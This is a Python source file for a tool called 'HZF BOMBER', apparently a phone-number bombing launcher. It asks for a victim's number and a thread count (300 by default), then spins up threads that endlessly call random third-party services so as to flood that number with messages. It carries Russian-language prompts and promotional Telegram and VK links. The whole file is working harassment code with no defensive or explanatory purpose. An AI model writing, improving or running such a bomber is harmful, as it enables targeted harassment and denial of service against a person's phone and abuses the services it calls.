import sys, os, pyfiglet, config
from StructService import Distribution_Service
from threading import Thread
from colorama import Fore



class Starter:
	def __init__(self):
		self.attack_number_phone = Distribution_Service()
		try:
			os.system("cls")
			os.system("clear")
		except OSError as error:
			False

	def startAttack(self, phone):
		self.attack_number_phone.phone(phone)

		while True:
		    try:
		        self.attack_number_phone.random_service()
		    except Exception as ex:
		    	print(ex)

	def start(self):
		print(Fore.YELLOW + pyfiglet.figlet_format("HZF BOMBER"))
		print('=======================================')
		print(Fore.GREEN + 'Telegram Channel - https://t.me/hzfnews')
		print(Fore.RED + 'VKontakte - https://vk.com/hzforum1')
		print(Fore.GREEN + f'Количество сервисов - {len(config.services)}')
		print(Fore.YELLOW + '============')
		phone = input('Номер (+): ')
		print('=======================================')
		try:
			self.attack_number_phone.phone(phone)
		except:
			print(Fore.RED + 'Неверный формат ввода.\nВведите номер в формате +XXXXXXXXXXXX')
			return self.start()

		try:
			threads = int(input('Потоков: '))	
		except:
			threads = 300
		print('============')

		for i in range(threads):
			th = Thread(target=self.startAttack, args=(phone,))
			th.start()



starting = Starter()
starting.start()




